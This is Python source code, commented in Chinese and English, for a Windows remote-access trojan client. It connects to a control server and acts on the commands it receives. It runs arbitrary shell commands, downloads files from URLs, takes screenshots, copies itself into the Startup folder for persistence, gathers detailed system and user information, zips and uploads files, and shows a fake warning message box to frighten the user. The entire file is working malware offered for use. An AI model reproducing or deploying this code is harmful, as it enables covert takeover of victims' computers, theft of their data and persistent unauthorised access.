import getpass
import logging
import os
import shutil
import socket
import requests
import win32api
import win32con
import wmi
import zipfile
import UpLoad
from PIL import ImageGrab
# Import
# 导入模块


# 主程序,提供远控功能
# Main
# 准备终止开发
class Main:
    def __str__(self):
        return '主程序,这里的每个功能都可以单独使用,但是需要socket'

    # 没啥功能
    # None
    def INFO(self, OvO='0'):
        CopyRight = 'YangWeb'
        UpdateTime = '2021/5/28 8:06'
        if OvO == '0':
            for i in range(10):
                print(i)
        elif OvO == 'Debug':
            print('You can`t debug')
        elif OvO == r'bGlhbmNoZW54aei/nuaZqOabpg==':
            print('....!?')
            print(CopyRight)
            print(UpdateTime)
        else:
            print('What?')

    # 压缩文件夹
    # Compress Folder
    def Zip(self, DirPath, outFullName):
        __zip = zipfile.ZipFile(outFullName, "w", zipfile.ZIP_DEFLATED)
        for path, DirNames, filenames in os.walk(DirPath):
            # 去掉目标跟路径，只对目标文件夹下边的文件及文件夹进行压缩
            fpath = path.replace(DirPath, '')

            for filename in filenames:
                __zip.write(os.path.join(path, filename), os.path.join(fpath, filename))
        __zip.close()

    # 保存日志
    # SaveLog
    def SaveLog(self, war, sav):
        logging.basicConfig(filename='C:\\Temp\\Log.bin',
                            format="[%(levelname)s]%(asctime)s - %(message)s",
                            level=logging.DEBUG)
        if war == 'Error':
            logging.error(sav)
        elif war == 'INFO':
            logging.info(sav)
        elif war == 'Debug':
            logging.debug(sav)
        else:
            pass

    # 遍历根目录文件
    # ListDir
    def ListDir(self):
        list = os.listdir('/')
        for i in list:
            s = '\n'
            client.send(i.encode())
            client.send(s.encode())

    # 获取Shell
    # GetShell
    def GetShell(self):
        client.send(b'Welcome to the cmd')
        responses = client.recv(1024)
        Cmd = responses.decode()
        output = os.popen(Cmd)
        result = output.readlines()
        NoName = ''
        result.append('end\n')
        result.append('close cmd')
        for i in result:
            NoName = NoName + i
        client.send(NoName.encode())

    # 下载文件
    # Download
    def Dl(self):
        client.send(b'Welcome to the download')
        responses = client.recv(1024)
        npth = responses.decode()
        lpth = r'C:/Temp/'

        def download(netPath, localPath):
            try:
                split = netPath.split('/')
                fileName = split[len(split) - 1]
                r = requests.get(netPath)
                with open(localPath + fileName, "wb") as code:
                    code.write(r.content)
            except:
                Main.SaveLog('Error', 'DownloadError')
                client.send(b'Download error')
            else:
                Main.SaveLog('INFO', 'DownloadSuccess')
                client.send(b'Download Success')

        download(npth, lpth)

    # 截屏
    # ScreenCapture
    def SC(self):
        width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        img = ImageGrab.grab(bbox=(0, 0, width, height))
        img.save('C:\\Temp\\jp.jpg')
        client.send(b'Success')

    # 帮助
    # Help
    def Help(self):
        Help = '''
        命令帮助:
        ls或者dir 这个命令都知道,实际上没用
        zqd 自启动
        download 下载文件
        warning 提醒电脑用户
        cmd 执行cmd命令(拿shell)不好用
        jp 截图(配合upload)(默认地址C:\\Temp\\jp.jpg)
        getuser 查看当前用户(并没什么用)
        log 看远控日志(滥竽充数)
        system 看目标机配置
        zip 把指定文件夹压缩
        upload 上传
        '''
        client.send(Help.encode())

    # 自启动
    # SelfStart
    def SelfStart(self):
        shutil.copyfile(__file__,
                        'C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\temp.exe')
        client.send(b'success')

    # 获取执行用户
    # ReturnUser
    def RetUser(self):
        users = getpass.getuser()
        client.send(users.encode())

    # 弹窗警告
    # APIWarning
    def Warning(self):
        win32api.MessageBox(0, "你电脑坏了", "危")
        client.send(b'Warning success')

    # 退出
    # Exit
    def Exit(self):
        client.close()
        exit()

    # 读取日志
    # Read Log
    def ReadLog(self):
        try:
            R = open('C:\\Temp\\Log.bin', 'rb')
        except:
            client.send(b'NO BIN')
        else:
            R = R.read()
            client.send(R)

    # 获取系统信息
    # GetSystemINFO
    def SysINFO(self):
        w = wmi.WMI()
        for CS in w.Win32_ComputerSystem():
            Computer = '电脑名称:' + CS.Caption + '\n' + '使用者:' + CS.UserName + '\n' + '制造商:' + CS.Manufacturer + '\n' + '工作组:' + CS.Workgroup + '\n' + '机器型号:' + CS.model + '\n '
            client.send(Computer.encode())
        for OS in w.Win32_OperatingSystem():
            System = ['操作系统:', OS.Caption, '语言版本:', OS.MUILanguages, '系统位数:', OS.OSArchitecture, '注册人:',
                      OS.RegisteredUser, '系统驱动:', OS.SystemDevice, '系统目录:', OS.SystemDirectory]
            for i in System:
                i = str(i)
                i = i + '\n'
                client.send(i.encode())
        for processor in w.Win32_Processor():
            CPU = ['CPU型号:', processor.Name.strip(), 'CPU核数:', processor.NumberOfCores]
            for l in CPU:
                l = str(l)
                l = l + '\n'
                client.send(l.encode())
        for BIOS in w.Win32_BIOS():
            bios = ['使用日期:', BIOS.Description, '主板型号:', BIOS.SerialNumber, '当前语言:', BIOS.CurrentLanguage]
            for b in bios:
                b = str(b)
                b = b + '\n'
                client.send(b.encode())
        for memModule in w.Win32_PhysicalMemory():
            totalMemSize = int(memModule.Capacity)
            totalmemsize = (totalMemSize / 1024 ** 3), 'GB'
            MEM = ['内存厂商:', memModule.Manufacturer, '内存型号:', memModule.PartNumber, '内存大小:', totalmemsize]
            for M in MEM:
                M = str(M)
                M = M + '\n'
                client.send(M.encode())
        for disk in w.Win32_DiskDrive():
            diskSize = int(disk.size)
            disksize = diskSize / 1024 ** 3, 'GB'
            Disk = ['磁盘名称:', disk.Caption, '硬盘型号:', disk.Model, '磁盘大小:', disksize]  # (diskSize / 1024 ** 3)]
            for d in Disk:
                d = str(d)
                d = d + '\n'
                client.send(d.encode())
        for xk in w.Win32_VideoController():
            VC = '显卡名称:' + xk.name
            client.send(VC.encode())
            client.send(b'\n')
            client.send(b'end')

    # 压缩zip调用
    # Compress zip
    def cozip(self):
        client.send(b'Compress zip')
        __response = client.recv(1024)
        Reception = __response.decode()
        dp = Reception
        ofn = 'C:\\Temp\\o.zip'
        try:
            Main.Zip(dp, ofn)
        except:
            client.send(b'Error!')
            Main.SaveLog('Error', 'ZIP')
        else:
            client.send(b'Success')
            Main.SaveLog('INFO', 'ZIP')

    # 版本号
    # Version
    def Version(self, Version='6.0'):
        client.send(b'Version 6.0')
        print(Version)

    def upload(self):
        client.send(b'File Path')
        up = client.recv(1024)
        up = up.decode()
        Path = up
        client.send(b'File Name')
        up = client.recv(1024)
        up = up.decode()
        Name = up
        try:
            UpLoad.Upload(Path, Name)
        except:
            client.send(b'Error')
        else:
            client.send(b'Success')


# 调用主程序
# RunMain


def Run():
    # 条件判断

    while True:
        response = client.recv(1024)
        Reception = response.decode()
        if Reception == 'ls' or Reception == 'dir':
            Main.ListDir()
        elif Reception == 'zqd':
            Main.SelfStart()
        elif Reception == 'help' or Reception == 'Help' or Reception == 'h':
            Main.Help()
        elif Reception == 'warning' or Reception == 'Warning':
            Main.Warning()
        elif Reception == 'cmd':
            Main.GetShell()
        elif Reception == 'download' or Reception == 'dl':
            Main.Dl()
        elif Reception == 'jp':
            Main.SC()
        elif Reception == 'getuser':
            Main.RetUser()
        elif Reception == 'exit':
            Main.SaveLog('INFO', 'Exit')
            Main.Exit()
        elif Reception == 'log':
            Main.ReadLog()
        elif Reception == 'system':
            Main.SysINFO()
        elif Reception == 'zip':
            Main.cozip()
        elif Reception == 'Version':
            Main.Version()
        elif Reception == 'upload':
            Main.upload()
        else:
            client.send(b'Not have this command')
            Main.SaveLog('INFO', 'NotThisCommand')


if __name__ == '__main__':
    # 连接服务端
    # ConnectServer
    try:
        host = '127.0.0.1'
        port = '8888'
        client = socket.create_connection((host, int(port)))
        client.send(b'Connect Success')
        Main = Main()
        Main.SaveLog('INFO', 'ConnectSuccess')
    except:
        Main = Main()
        Main.SaveLog('Error', 'ConnectError')
        exit()
    else:
        Run()
